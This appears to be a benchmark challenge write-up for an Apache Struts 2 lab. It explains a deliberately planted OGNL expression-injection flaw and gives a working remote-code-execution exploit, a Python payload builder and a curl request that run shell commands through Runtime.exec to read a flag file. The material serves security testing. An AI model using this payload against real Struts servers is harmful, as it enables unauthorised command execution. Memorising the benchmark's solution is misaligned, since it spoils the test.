# XBEN-035-24 — OGNL fun

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** OGNL expression injection → Remote Code Execution in a custom Apache Struts 2 action.

## Summary

`web/src/main/java/com/example/struts/SendMessageAction.java` implements a deliberately-vulnerable setter:

```java
public void setMessage(String message) {
    ReflectionContextState.setDenyMethodExecution(ActionContext.getContext().getContextMap(), false);
    this.message = TextParseUtil.translateVariables(message, ActionContext.getContext().getValueStack());
}
```

It explicitly disables Struts/OGNL's "deny method execution" protection and then runs the raw, attacker-supplied `message` parameter through `TextParseUtil.translateVariables`, which evaluates any `%{ ... }` (or `${ ... }`) segment as a live OGNL expression against the value stack. `struts.xml` additionally sets `struts.ognl.allowStaticMethodAccess=true`, so static-method calls such as `@java.lang.Runtime@getRuntime()` are permitted. The evaluated/substituted string is then rendered unescaped by `success.jsp` (`<s:property value="message" escapeHtml="false"/>`). This gives a classic unauthenticated Struts2 OGNL-injection RCE: any command run via `Runtime.exec()` from inside the OGNL expression has its output echoed straight back in the HTTP response.

Note: OGNL's comma "sequence" operator (`%{1,2}`) did not evaluate as expected in this app/library combination (returned empty) — the working technique is to chain **multiple separate `%{...}` blocks** in the same `message` value; `TextParseUtil.translateVariables` evaluates each block in order and concatenates the string results, letting state (`#a`, `#b`, …) persist across blocks via the shared OGNL context.

## Exploit

```bash
python3 -c "
import urllib.parse
segs = [
 '#a=@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{\"/bin/sh\",\"-c\",\"cat /tmp/flag 2>&1\"})',
 '#a.waitFor()',
 '@org.apache.commons.io.IOUtils@toString(#a.getInputStream())'
]
payload = ''.join('%{'+s+'}' for s in segs)
print(urllib.parse.quote(payload))
" > payload.txt

PORT=65178
P=$(cat payload.txt)
curl -s "http://localhost:$PORT/sendMessageAction.action" --data "message=$P"
```

The three `%{...}` blocks: (1) spawn `/bin/sh -c "cat /tmp/flag 2>&1"` via `Runtime.exec()`, (2) wait for it to finish, (3) read its stdout into a string via `org.apache.commons.io.IOUtils` (bundled with Struts) and return it — which becomes part of the rendered `message` value.
